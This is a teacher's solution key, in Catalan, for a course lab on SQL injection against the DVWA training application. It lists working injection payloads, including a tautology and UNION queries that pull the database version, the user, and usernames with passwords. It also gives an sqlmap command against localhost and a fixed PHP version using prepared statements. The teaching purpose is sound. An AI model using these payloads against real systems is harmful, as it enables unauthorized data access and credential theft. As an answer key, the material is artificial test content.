---
tipus: solucio_docent
codi: "SOL-LAB-05"
exercici_associat: "[[03_Exercicis_i_Labs/Enunciats/LAB_05_SQLi_DVWA|LAB-05]]"
bloc: "02_Hacking_Web"
ra:
  - "RA2"
  - "RA3"
tags:
  - docencia/solucio
  - vulnerabilitat/sqli
  - ra/ra2
  - ra/ra3
---

# 🧑‍🏫 Guia de Correcció i Solució: LAB-05 (Explotació i Correcció SQLi)

## 🎯 Resolució Pas a Pas de Referència

### 1. Payload per extreure tots els usuaris
```sql
1' OR '1'='1
```

### 2. Extracció de versió i usuaris de MariaDB amb UNION
```sql
1' UNION SELECT null, version() #
1' UNION SELECT null, user() #
1' UNION SELECT user, password FROM users #
```

### 3. Comanda SQLmap directa
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<COOKIE>; security=low" \
  --batch --dbs
```

### 4. Codi PHP Corregit Obligatori (Sentència Preparada)
```php
// SOLUCIÓ DEFENSIVA AMB PDO
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->execute(['id' => $id]);
$results = $stmt->fetchAll();
```
